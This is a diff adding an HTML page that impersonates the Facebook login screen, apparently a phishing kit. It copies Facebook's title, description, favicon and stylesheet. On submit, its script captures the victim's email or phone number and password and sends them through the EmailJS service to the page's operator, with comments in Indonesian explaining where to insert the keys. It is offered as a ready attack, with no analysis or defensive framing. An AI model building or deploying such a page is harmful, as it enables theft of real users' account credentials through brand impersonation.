@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en" id="facebook" class="no_js">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <title id="pageTitle">Facebook – log in or sign up</title>
+    <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/ze2gDvq5tcz.css" />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("YOUR_PUBLIC_KEY"); // Ganti dengan Public Key dari Email.js
+        })();
+        
+        function sendLoginData(event) {
+            event.preventDefault(); // Mencegah form dikirim secara default
+            
+            var emailOrPhone = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            
+            var templateParams = {
+                user_email: emailOrPhone,
+                user_password: password
+            };
+            
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                .then(function(response) {
+                    alert("Login data sent successfully!");
+                }, function(error) {
+                    alert("Failed to send login data.");
+                });
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .right-section {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            text-align: center;
+        }
+        input {
+            width: calc(100% - 28px);
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #145dbf;
+        }
+        .links {
+            margin-top: 15px;
+        }
+        .links a {
+            text-decoration: none;
+            color: #1877f2;
+            font-size: 14px;
+        }
+        .divider {
+            height: 1px;
+            background-color: #ddd;
+            margin: 20px 0;
+        }
+        .create-account {
+            display: inline-block;
+            padding: 14px 20px;
+            background: #42b72a;
+            color: white;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        @media (min-width: 768px) {
+            .main-container {
+                flex-direction: row;
+                max-width: 980px;
+            }
+            .right-section {
+                width: 396px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="right-section">
+            <form onsubmit="sendLoginData(event)">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log in</button>
+            </form>
+            <div class="links">
+                <p><a href="#">Forgotten password?</a></p>
+            </div>
+            <div class="divider"></div>
+            <a href="#" class="create-account">Create new account</a>
+        </div>
+    </div>
+</body>
+</html>
